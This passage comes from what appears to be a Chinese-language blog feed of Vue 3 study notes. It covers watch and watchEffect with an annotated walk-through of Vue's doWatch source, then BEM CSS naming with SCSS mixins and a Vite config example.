&quot;qux&quot;,</span><br><span class="line">        tag: &quot;qur&quot;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">// 参数1：要被侦听的数据 参数2：回调函数cb</span><br><span class="line">// watch(message, (newValue, oldValue)=&gt; &#123;</span><br><span class="line">//   // 参数1：新值 参数2：旧值</span><br><span class="line">//   console.log(newValue, oldValue)</span><br><span class="line">// &#125;)</span><br><span class="line"></span><br><span class="line">// 也可以侦听多个词</span><br><span class="line">// 此时参数1和回调函数的两个参数都是数组，它们的顺序对应</span><br><span class="line">watch([message, message2], (newValue, oldValue)=&gt; &#123;</span><br><span class="line">  console.log(newValue, oldValue)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">// 参数3是options配置项</span><br><span class="line">watch(message3, (newValue, oldValue)=&gt; &#123;</span><br><span class="line">  // 监听引用类型时，所返回的新值和旧值是一样的</span><br><span class="line">  console.log(newValue, oldValue)</span><br><span class="line">&#125;, &#123;</span><br><span class="line">  // 开启深度监听，能监听到对象的深层嵌套内容</span><br><span class="line">  // 如果引用类型是由reactive包裹的，则不开启深度监听也能被监听</span><br><span class="line">  deep: true,</span><br><span class="line"></span><br><span class="line">  // 立马就让cb执行一次，此次的newValue为数据的默认值，oldValue为undefined</span><br><span class="line">  immediate: true,</span><br><span class="line"></span><br><span class="line">  // pre：组件更新之前执行 sync：与组件更新同步执行 post：组件更新之后执行</span><br><span class="line">  flush: &quot;pre&quot;</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">// 这样监听一个对象的某一属性值</span><br><span class="line">// watch(()=&gt; message3.foo.bar.baz.value, (newValue, oldValue)=&gt; &#123;</span><br><span class="line">//   console.log(newValue, oldValue)</span><br><span class="line">// &#125;)</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<h1 id="watchEffect"><a href="#watchEffect" class="headerlink" title="watchEffect"></a>watchEffect</h1><p>另一种监听数据的方式</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;div&gt;</span><br><span class="line">    case1: &lt;input v-model=&quot;message&quot; type=&quot;text&quot; ref=&quot;ipt&quot;&gt;</span><br><span class="line">    &lt;hr&gt;</span><br><span class="line">    case2: &lt;input v-model=&quot;message2&quot; type=&quot;text&quot;&gt;</span><br><span class="line">    &lt;hr&gt;</span><br><span class="line">    &lt;button @click=&quot;stopWatch&quot;&gt;停止监听&lt;/button&gt;</span><br><span class="line">  &lt;/div&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script setup lang=&quot;ts&quot;&gt;</span><br><span class="line">import &#123; ref, watchEffect &#125; from &quot;vue&quot;</span><br><span class="line"></span><br><span class="line">const message = ref&lt;string&gt;(&quot;野兽先辈&quot;)</span><br><span class="line"></span><br><span class="line">const message2 = ref&lt;string&gt;(&quot;野兽妹&quot;)</span><br><span class="line"></span><br><span class="line">const ipt = ref&lt;HTMLInputElement&gt;()</span><br><span class="line"></span><br><span class="line">// 只要是写进回调函数内的数据都会被监听</span><br><span class="line">// 一进页面，回调函数就会立即被调用</span><br><span class="line">// 返回值是一个监听停止操作函数</span><br><span class="line">const stop = watchEffect((oninvalidate)=&gt; &#123;</span><br><span class="line">  console.log(&quot;message=====&gt;&quot;, message.value)</span><br><span class="line">  console.log(&quot;message2=====&gt;&quot;, message2.value)</span><br><span class="line"></span><br><span class="line">  // 刚开始dom还没挂载，所以输出的一定是undefined</span><br><span class="line">  // 配置项中使用flush: &quot;post&quot;即可挂载后读</span><br><span class="line">  console.log(ipt.value, &quot;input&quot;)</span><br><span class="line"></span><br><span class="line">  // 在监听cb之前做一些其他处理，这个函数的调用先于函数体内其他代码</span><br><span class="line">  // 可以用来进行防抖、清除接口等操作</span><br><span class="line">  oninvalidate(()=&gt; &#123;</span><br><span class="line">    console.log(&quot;before&quot;)</span><br><span class="line">  &#125;)</span><br><span class="line">&#125;, &#123;</span><br><span class="line">  // DOM挂载后读</span><br><span class="line">  flush: &quot;post&quot;,</span><br><span class="line"></span><br><span class="line">  // 开发环境的调试函数</span><br><span class="line">  onTrigger(e) &#123;</span><br><span class="line">    console.log(e)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">// 调用监听停止操作函数就能停止该数据监听</span><br><span class="line">const stopWatch = ()=&gt; stop()</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<h1 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h1><p>在Vue源码（<code>/package/runtime-core/src/apiWatch.ts</code>）中可以看到watch的源码。</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">function</span> watch&lt;T = <span class="built_in">any</span>, <span class="title class_">Immediate</span> <span class="keyword">extends</span> <span class="title class_">Readonly</span>&lt;<span class="built_in">boolean</span>&gt; = <span class="literal">false</span>&gt;(</span><br><span class="line">  <span class="attr">source</span>: T | <span class="title class_">WatchSource</span>&lt;T&gt;,</span><br><span class="line">  <span class="attr">cb</span>: <span class="built_in">any</span>,</span><br><span class="line">  options?: <span class="title class_">WatchOptions</span>&lt;<span class="title class_">Immediate</span>&gt;</span><br><span class="line">): <span class="title class_">WatchStopHandle</span> &#123;</span><br><span class="line">  <span class="keyword">if</span> (__DEV__ &amp;&amp; !<span class="title function_">isFunction</span>(cb)) &#123;</span><br><span class="line">    <span class="title function_">warn</span>(</span><br><span class="line">      <span class="string">`\`watch(fn, options?)\` signature has been moved to a separate API. `</span> +</span><br><span class="line">        <span class="string">`Use \`watchEffect(fn, options?)\` instead. \`watch\` now only `</span> +</span><br><span class="line">        <span class="string">`supports \`watch(source, cb, options?) signature.`</span></span><br><span class="line">    )</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="title function_">doWatch</span>(source <span class="keyword">as</span> <span class="built_in">any</span>, cb, options)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">doWatch</span>(<span class="params"></span></span><br><span class="line"><span class="params">  source: WatchSource | WatchSource[] | WatchEffect | <span class="built_in">object</span>,</span></span><br><span class="line"><span class="params">  cb: WatchCallback | <span class="literal">null</span>,</span></span><br><span class="line"><span class="params">  &#123; immediate, deep, flush, onTrack, onTrigger &#125;: WatchOptions = EMPTY_OBJ</span></span><br><span class="line"><span class="params"></span>): <span class="title class_">WatchStopHandle</span> &#123;</span><br><span class="line">  <span class="comment">// 一些错误处理</span></span><br><span class="line">  <span class="keyword">if</span> (__DEV__ &amp;&amp; !cb) &#123;</span><br><span class="line">    <span class="keyword">if</span> (immediate !== <span class="literal">undefined</span>) &#123;</span><br><span class="line">      <span class="title function_">warn</span>(</span><br><span class="line">        <span class="string">`watch() &quot;immediate&quot; option is only respected when using the `</span> +</span><br><span class="line">          <span class="string">`watch(source, callback, options?) signature.`</span></span><br><span class="line">      )</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (deep !== <span class="literal">undefined</span>) &#123;</span><br><span class="line">      <span class="title function_">warn</span>(</span><br><span class="line">        <span class="string">`watch() &quot;deep&quot; option is only respected when using the `</span> +</span><br><span class="line">          <span class="string">`watch(source, callback, options?) signature.`</span></span><br><span class="line">      )</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">const</span> <span class="title function_">warnInvalidSource</span> = (<span class="params">s: <span class="built_in">unknown</span></span>) =&gt; &#123;</span><br><span class="line">    <span class="title function_">warn</span>(</span><br><span class="line">      <span class="string">`Invalid watch source: `</span>,</span><br><span class="line">      s,</span><br><span class="line">      <span class="string">`A watch source can only be a getter/effect function, a ref, `</span> +</span><br><span class="line">        <span class="string">`a reactive object, or an array of these types.`</span></span><br><span class="line">    )</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">const</span> instance =</span><br><span class="line">    <span class="title function_">getCurrentScope</span>() === currentInstance?.<span class="property">scope</span> ? currentInstance : <span class="literal">null</span></span><br><span class="line">  <span class="comment">// const instance = currentInstance</span></span><br><span class="line">  <span class="keyword">let</span> <span class="attr">getter</span>: <span class="function">() =&gt;</span> <span class="built_in">any</span></span><br><span class="line">  <span class="keyword">let</span> forceTrigger = <span class="literal">false</span></span><br><span class="line">  <span class="keyword">let</span> isMultiSource = <span class="literal">false</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// 格式化source，赋给getter函数</span></span><br><span class="line">  <span class="keyword">if</span> (<span class="title function_">isRef</span>(source)) &#123;</span><br><span class="line">    <span class="comment">// 如果是ref对象，创建一个getter函数并读取了ref对象的value属性</span></span><br><span class="line">    getter = <span class="function">() =&gt;</span> source.<span class="property">value</span></span><br><span class="line">    forceTrigger = <span class="title function_">isShallow</span>(source)</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="title function_">isReactive</span>(source)) &#123;</span><br><span class="line">    <span class="comment">// 如果是reactive对象，直接返回一个getter函数，并设deep为true</span></span><br><span class="line">    getter = <span class="function">() =&gt;</span> source</span><br><span class="line">    deep = <span class="literal">true</span></span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="title function_">isArray</span>(source)) &#123;</span><br><span class="line">    isMultiSource = <span class="literal">true</span></span><br><span class="line">    forceTrigger = source.<span class="title function_">some</span>(<span class="function"><span class="params">s</span> =&gt;</span> <span class="title function_">isReactive</span>(s) || <span class="title function_">isShallow</span>(s))</span><br><span class="line">    getter = <span class="function">() =&gt;</span></span><br><span class="line">      <span class="comment">// 如果是数组，遍历并处理里面的ref和reactive</span></span><br><span class="line">      source.<span class="title function_">map</span>(<span class="function"><span class="params">s</span> =&gt;</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_">isRef</span>(s)) &#123;</span><br><span class="line">          <span class="keyword">return</span> s.<span class="property">value</span></span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="title function_">isReactive</span>(s)) &#123;</span><br><span class="line">          <span class="comment">// 递归对每个属性进行侦听</span></span><br><span class="line">          <span class="keyword">return</span> <span class="title function_">traverse</span>(s)</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="title function_">isFunction</span>(s)) &#123;</span><br><span class="line">          <span class="comment">// 进行某种封装</span></span><br><span class="line">          <span class="keyword">return</span> <span class="title function_">callWithErrorHandling</span>(s, instance, <span class="title class_">ErrorCodes</span>.<span class="property">WATCH_GETTER</span>)</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">          __DEV__ &amp;&amp; <span class="title function_">warnInvalidSource</span>(s)</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;)</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="title function_">isFunction</span>(source)) &#123;</span><br><span class="line">    <span class="comment">// 如果是函数，判断cb是否存在</span></span><br><span class="line">    <span class="keyword">if</span> (cb) &#123;</span><br><span class="line">      <span class="comment">// getter with cb</span></span><br><span class="line">      <span class="comment">// cb存在，getter对source进行简单的封装</span></span><br><span class="line">      getter = <span class="function">() =&gt;</span></span><br><span class="line">        <span class="title function_">callWithErrorHandling</span>(source, instance, <span class="title class_">ErrorCodes</span>.<span class="property">WATCH_GETTER</span>)</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="comment">// no cb -&gt; simple effect</span></span><br><span class="line">      <span class="comment">// cb不存在，会执行watch effect</span></span><br><span class="line">      getter = <span class="function">() =&gt;</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (instance &amp;&amp; instance.<span class="property">isUnmounted</span>) &#123;</span><br><span class="line">          <span class="keyword">return</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (cleanup) &#123;</span><br><span class="line">          <span class="title function_">cleanup</span>()</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_">callWithAsyncErrorHandling</span>(</span><br><span class="line">          source,</span><br><span class="line">          instance,</span><br><span class="line">          <span class="title class_">ErrorCodes</span>.<span class="property">WATCH_CALLBACK</span>,</span><br><span class="line">          [onCleanup]</span><br><span class="line">        )</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    getter = <span class="variable constant_">NOOP</span></span><br><span class="line">    __DEV__ &amp;&amp; <span class="title function_">warnInvalidSource</span>(source)</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 2.x array mutation watch compat</span></span><br><span class="line">  <span class="keyword">if</span> (__COMPAT__ &amp;&amp; cb &amp;&amp; !deep) &#123;</span><br><span class="line">    <span class="keyword">const</span> baseGetter = getter</span><br><span class="line">    getter = <span class="function">() =&gt;</span> &#123;</span><br><span class="line">      <span class="keyword">const</span> val = <span class="title function_">baseGetter</span>()</span><br><span class="line">      <span class="keyword">if</span> (</span><br><span class="line">        <span class="title function_">isArray</span>(val) &amp;&amp;</span><br><span class="line">        <span class="title function_">checkCompatEnabled</span>(<span class="title class_">DeprecationTypes</span>.<span class="property">WATCH_ARRAY</span>, instance)</span><br><span class="line">      ) &#123;</span><br><span class="line">        <span class="title function_">traverse</span>(val)</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">return</span> val</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 处理deep深度监听</span></span><br><span class="line">  <span class="keyword">if</span> (cb &amp;&amp; deep) &#123;</span><br><span class="line">    <span class="keyword">const</span> baseGetter = getter</span><br><span class="line">    <span class="comment">// 递归对每个属性进行侦听，比较耗时，非必要不开启</span></span><br><span class="line">    getter = <span class="function">() =&gt;</span> <span class="title function_">traverse</span>(<span class="title function_">baseGetter</span>())</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">let</span> <span class="attr">cleanup</span>: <span class="function">() =&gt;</span> <span class="built_in">void</span></span><br><span class="line">  <span class="keyword">let</span> <span class="attr">onCleanup</span>: <span class="title class_">OnCleanup</span> = <span class="function">(<span class="params">fn: () =&gt; <span class="built_in">void</span></span>) =&gt;</span> &#123;</span><br><span class="line">    cleanup = effect.<span class="property">onStop</span> = <span class="function">() =&gt;</span> &#123;</span><br><span class="line">      <span class="title function_">callWithErrorHandling</span>(fn, instance, <span class="title class_">ErrorCodes</span>.<span class="property">WATCH_CLEANUP</span>)</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// in SSR there is no need to setup an actual effect, and it should be noop</span></span><br><span class="line">  <span class="comment">// unless it&#x27;s eager or sync flush</span></span><br><span class="line">  <span class="keyword">let</span> <span class="attr">ssrCleanup</span>: (<span class="function">() =&gt;</span> <span class="built_in">void</span>)[] | <span class="literal">undefined</span></span><br><span class="line">  <span class="keyword">if</span> (__SSR__ &amp;&amp; isInSSRComponentSetup) &#123;</span><br><span class="line">    <span class="comment">// we will also not call the invalidate callback (+ runner is not set up)</span></span><br><span class="line">    onCleanup = <span class="variable constant_">NOOP</span></span><br><span class="line">    <span class="keyword">if</span> (!cb) &#123;</span><br><span class="line">      <span class="title function_">getter</span>()</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (immediate) &#123;</span><br><span class="line">      <span class="title function_">callWithAsyncErrorHandling</span>(cb, instance, <span class="title class_">ErrorCodes</span>.<span class="property">WATCH_CALLBACK</span>, [</span><br><span class="line">        <span class="title function_">getter</span>(),</span><br><span class="line">        isMultiSource ? [] : <span class="literal">undefined</span>,</span><br><span class="line">        onCleanup</span><br><span class="line">      ])</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (flush === <span class="string">&#x27;sync&#x27;</span>) &#123;</span><br><span class="line">      <span class="keyword">const</span> ctx = <span class="title function_">useSSRContext</span>() <span class="keyword">as</span> <span class="title class_">SSRContext</span></span><br><span class="line">      ssrCleanup = ctx.<span class="property">__watcherHandles</span> || (ctx.<span class="property">__watcherHandles</span> = [])</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="variable constant_">NOOP</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 给旧值作初始化</span></span><br><span class="line">  <span class="keyword">let</span> <span class="attr">oldValue</span>: <span class="built_in">any</span> = isMultiSource</span><br><span class="line">    ? <span class="keyword">new</span> <span class="title class_">Array</span>((source <span class="keyword">as</span> []).<span class="property">length</span>).<span class="title function_">fill</span>(<span class="variable constant_">INITIAL_WATCHER_VALUE</span>)</span><br><span class="line">    : <span class="variable constant_">INITIAL_WATCHER_VALUE</span></span><br><span class="line">  </span><br><span class="line">  <span class="comment">// 进行监听的核心，cb也在这里调用</span></span><br><span class="line">  <span class="keyword">const</span> <span class="attr">job</span>: <span class="title class_">SchedulerJob</span> = <span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (!effect.<span class="property">active</span>) &#123;</span><br><span class="line">      <span class="keyword">return</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (cb) &#123;</span><br><span class="line">      <span class="comment">// watch(source, cb)</span></span><br><span class="line">      <span class="comment">// 获取新值</span></span><br><span class="line">      <span class="keyword">const</span> newValue = effect.<span class="title function_">run</span>()</span><br><span class="line">      <span class="keyword">if</span> (</span><br><span class="line">        deep ||</span><br><span class="line">        forceTrigger ||</span><br><span class="line">        (isMultiSource</span><br><span class="line">          ? (newValue <span class="keyword">as</span> <span class="built_in">any</span>[]).<span class="title function_">some</span>(<span class="function">(<span class="params">v, i</span>) =&gt;</span></span><br><span class="line">              <span class="title function_">hasChanged</span>(v, (oldValue <span class="keyword">as</span> <span class="built_in">any</span>[])[i])</span><br><span class="line">            )</span><br><span class="line">          : <span class="title function_">hasChanged</span>(newValue, oldValue)) ||</span><br><span class="line">        (__COMPAT__ &amp;&amp;</span><br><span class="line">          <span class="title function_">isArray</span>(newValue) &amp;&amp;</span><br><span class="line">          <span class="title function_">isCompatEnabled</span>(<span class="title class_">DeprecationTypes</span>.<span class="property">WATCH_ARRAY</span>, instance))</span><br><span class="line">      ) &#123;</span><br><span class="line">        <span class="comment">// cleanup before running cb again</span></span><br><span class="line">        <span class="keyword">if</span> (cleanup) &#123;</span><br><span class="line">          <span class="title function_">cleanup</span>()</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="title function_">callWithAsyncErrorHandling</span>(cb, instance, <span class="title class_">ErrorCodes</span>.<span class="property">WATCH_CALLBACK</span>, [</span><br><span class="line">          newValue,</span><br><span class="line">          <span class="comment">// pass undefined as the old value when it&#x27;s changed for the first time</span></span><br><span class="line">          <span class="comment">// 第一次（immediate）执行旧值 oldValue是undefined或空数组</span></span><br><span class="line">          oldValue === <span class="variable constant_">INITIAL_WATCHER_VALUE</span></span><br><span class="line">            ? <span class="literal">undefined</span></span><br><span class="line">            : isMultiSource &amp;&amp; oldValue[<span class="number">0</span>] === <span class="variable constant_">INITIAL_WATCHER_VALUE</span></span><br><span class="line">            ? []</span><br><span class="line">            : oldValue,</span><br><span class="line">          onCleanup</span><br><span class="line">        ])</span><br><span class="line">        <span class="comment">// 直接赋值，更新旧值，一切操作执行完才会更新</span></span><br><span class="line">        <span class="comment">// 如果是对象的话，就直接引用了，所以会导致新旧值一样</span></span><br><span class="line">        oldValue = newValue</span><br><span class="line">      &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="comment">// 变成watchEffect模式</span></span><br><span class="line">      effect.<span class="title function_">run</span>()</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// important: mark the job as a watcher callback so that scheduler knows</span></span><br><span class="line">  <span class="comment">// it is allowed to self-trigger (#1727)</span></span><br><span class="line">  job.<span class="property">allowRecurse</span> = !!cb</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 调度模式</span></span><br><span class="line">  <span class="keyword">let</span> <span class="attr">scheduler</span>: <span class="title class_">EffectScheduler</span></span><br><span class="line">  <span class="keyword">if</span> (flush === <span class="string">&#x27;sync&#x27;</span>) &#123;</span><br><span class="line">    <span class="comment">// 同步执行</span></span><br><span class="line">    scheduler = job <span class="keyword">as</span> <span class="built_in">any</span> <span class="comment">// the scheduler function gets called directly</span></span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span> (flush === <span class="string">&#x27;post&#x27;</span>) &#123;</span><br><span class="line">    <span class="comment">// 把job传给queuePostRenderEffect（组件更新后执行）</span></span><br><span class="line">    scheduler = <span class="function">() =&gt;</span> <span class="title function_">queuePostRenderEffect</span>(job, instance &amp;&amp; instance.<span class="property">suspense</span>)</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="comment">// 组件更新前执行</span></span><br><span class="line">    <span class="comment">// default: &#x27;pre&#x27;</span></span><br><span class="line">    job.<span class="property">pre</span> = <span class="literal">true</span></span><br><span class="line">    <span class="keyword">if</span> (instance) job.<span class="property">id</span> = instance.<span class="property">uid</span></span><br><span class="line">    scheduler = <span class="function">() =&gt;</span> <span class="title function_">queueJob</span>(job)</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 收集依赖（没有更新，所以job还不会走）</span></span><br><span class="line">  <span class="comment">// 更新的时候就会调用scheduler，进而调用job，这时就能读到新值了</span></span><br><span class="line">  <span class="keyword">const</span> effect = <span class="keyword">new</span> <span class="title class_">ReactiveEffect</span>(getter, scheduler)</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (__DEV__) &#123;</span><br><span class="line">    effect.<span class="property">onTrack</span> = onTrack</span><br><span class="line">    effect.<span class="property">onTrigger</span> = onTrigger</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// initial run</span></span><br><span class="line">  <span class="keyword">if</span> (cb) &#123;</span><br><span class="line">    <span class="comment">// 传了cb</span></span><br><span class="line">    <span class="keyword">if</span> (immediate) &#123;</span><br><span class="line">      <span class="comment">// 设置了immediate，立马调用一次</span></span><br><span class="line">      <span class="title function_">job</span>()</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="comment">// 没有设置immediate，给旧值设置初始值</span></span><br><span class="line">      oldValue = effect.<span class="title function_">run</span>()</span><br><span class="line">    &#125;</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span> (flush === <span class="string">&#x27;post&#x27;</span>) &#123;</span><br><span class="line">    <span class="title function_">queuePostRenderEffect</span>(</span><br><span class="line">      effect.<span class="property">run</span>.<span class="title function_">bind</span>(effect),</span><br><span class="line">      instance &amp;&amp; instance.<span class="property">suspense</span></span><br><span class="line">    )</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    effect.<span class="title function_">run</span>()</span><br><span class="line">  &#125;</span><br><span class="line">      </span><br><span class="line">  <span class="comment">// 取消侦听的函数作为返回值</span></span><br><span class="line">  <span class="keyword">const</span> <span class="title function_">unwatch</span> = (<span class="params"></span>) =&gt; &#123;</span><br><span class="line">    effect.<span class="title function_">stop</span>()</span><br><span class="line">    <span class="keyword">if</span> (instance &amp;&amp; instance.<span class="property">scope</span>) &#123;</span><br><span class="line">      <span class="title function_">remove</span>(instance.<span class="property">scope</span>.<span class="property">effects</span>!, effect)</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (__SSR__ &amp;&amp; ssrCleanup) ssrCleanup.<span class="title function_">push</span>(unwatch)</span><br><span class="line">  <span class="keyword">return</span> unwatch  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>前端</category>
        <category>学习</category>
      </categories>
      <tags>
        <tag>前端</tag>
        <tag>学习</tag>
        <tag>Vue.js</tag>
      </tags>
  </entry>
  <entry>
    <title>BEM架构&amp;Layout布局</title>
    <url>/web/study/Vue/13.BEM%E6%9E%B6%E6%9E%84&amp;Layout%E5%B8%83%E5%B1%80.html</url>
    <content><![CDATA[<p>本系列为视频课程的学习笔记。原课程：<a href="https://www.bilibili.com/video/BV1dS4y1y7vd?p=3&vd_source=abff2190dd215e2033f2ec57123dd1d6">Vue3 + vite + Ts + pinia + 实战 + 源码 +electron</a></p>
<h1 id="BEM架构"><a href="#BEM架构" class="headerlink" title="BEM架构"></a>BEM架构</h1><p>BEM架构是OOCSS架构（面向对象CSS）的一种实现。</p>
<p>BEM是block（块层）、element（元素层）、modifier（修饰符层）的缩写。</p>
<p>Element+用的就是这种架构。</p>
<p>BEM的命名规范：</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* 块，一个元素区域 */</span></span><br><span class="line"><span class="selector-class">.block</span> &#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 元素，块内的某元素 */</span> </span><br><span class="line"><span class="selector-class">.block__element</span> &#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 修饰符，一些同类元素的区分 */</span> </span><br><span class="line"><span class="selector-class">.block--modifier</span> &#123;&#125;</span><br></pre></td></tr></table></figure>

<h1 id="编写bem架构"><a href="#编写bem架构" class="headerlink" title="编写bem架构"></a>编写bem架构</h1><p>全局bem.scss：</p>
<figure class="highlight scss"><table><tr><td class="code"><pre><span class="line"><span class="comment">// !default：变量如果没有赋过别的值，就使用&quot;cheriko&quot;这个默认值</span></span><br><span class="line"><span class="variable">$namespace</span>: <span class="string">&quot;cheriko&quot;</span> !default;</span><br><span class="line"><span class="variable">$block-sel</span>: <span class="string">&quot;-&quot;</span> !default;</span><br><span class="line"><span class="variable">$elem-sel</span>: <span class="string">&quot;__&quot;</span> !default;</span><br><span class="line"><span class="variable">$mod-sel</span>: <span class="string">&quot;--&quot;</span> !default;</span><br><span class="line"></span><br><span class="line"><span class="keyword">@mixin</span> b(<span class="variable">$block</span>) &#123;</span><br><span class="line">  <span class="comment">// 拼装类名</span></span><br><span class="line">  <span class="variable">$B</span>: #&#123;<span class="variable">$namespace</span> + <span class="variable">$block-sel</span> + <span class="variable">$block</span>&#125;;</span><br><span class="line">  .#&#123;<span class="variable">$B</span>&#125; &#123;</span><br><span class="line">    <span class="comment">// 会被替换成真正的样式</span></span><br><span class="line">    <span class="keyword">@content</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">@mixin</span> e(<span class="variable">$el</span>) &#123;</span><br><span class="line">  <span class="comment">// 读取父级类名</span></span><br><span class="line">  <span class="variable">$selector</span>: &amp;;</span><br><span class="line">  <span class="comment">// 跳出嵌套</span></span><br><span class="line">  <span class="keyword">@at-root</span> &#123;</span><br><span class="line">    <span class="comment">// 拼装类名</span></span><br><span class="line">    #&#123;<span class="variable">$selector</span> + <span class="variable">$elem-sel</span> + <span class="variable">$el</span>&#125; &#123;</span><br><span class="line">      <span class="keyword">@content</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">@mixin</span> m(<span class="variable">$m</span>) &#123;</span><br><span class="line">  <span class="comment">// 读取父级类名</span></span><br><span class="line">  <span class="variable">$selector</span>: &amp;;</span><br><span class="line">  <span class="comment">// 跳出嵌套</span></span><br><span class="line">  <span class="keyword">@at-root</span> &#123;</span><br><span class="line">    <span class="comment">// 拼装类名</span></span><br><span class="line">    #&#123;<span class="variable">$selector</span> + <span class="variable">$mod-sel</span> + <span class="variable">$m</span>&#125; &#123;</span><br><span class="line">      <span class="keyword">@content</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在vite.config.ts中加入配置：</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="attr">css</span>: &#123;</span><br><span class="line">    <span class="attr">preprocessorOptions</span>: &#123;</span><br><span class="line">      <span class="attr">scss</span>: &#123;</span><br><span class="line">        <span class="attr">additionalData</span>: <span class="string">`@import &quot;@/bem.scss&quot;;`</span></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

<p>在App.vue中测试：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;div&gt;</span><br><span class="line">    &lt;h1 class=&quot;cheriko-test&quot;&gt;</span><br><span class="line">      1145141919810</span><br><span class="line">      &lt;div class=&quot;cheriko-test__inner&quot;&gt;el&lt;/div&gt;</span><br><span class="line">      &lt;div class=&quot;cheriko-test--success&quot;&gt;test&lt;/div&gt;</span><br><span class="line">    &lt;/h1&gt;</span><br><span class="line">  &lt;/div&gt;</span><br><span class="line">&lt;/template&gt; </span><br><span class="line"></span><br><span class="line">&lt;style lang=&quot;scss&quot;&gt;</span><br><span class="line">@include b(test) &#123;</span><br><span class="line">  color: red;</span><br><span class="line">  @include e(inner) &#123;</span><br><span class="line">    color: blue;</span><br><span class="line">  &#125;</span><br><span class="line">  @include m(success) &#123;</span><br><span class="line">    color: green;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">&lt;/style&gt;</span><br></pre></td></tr></table></figure>

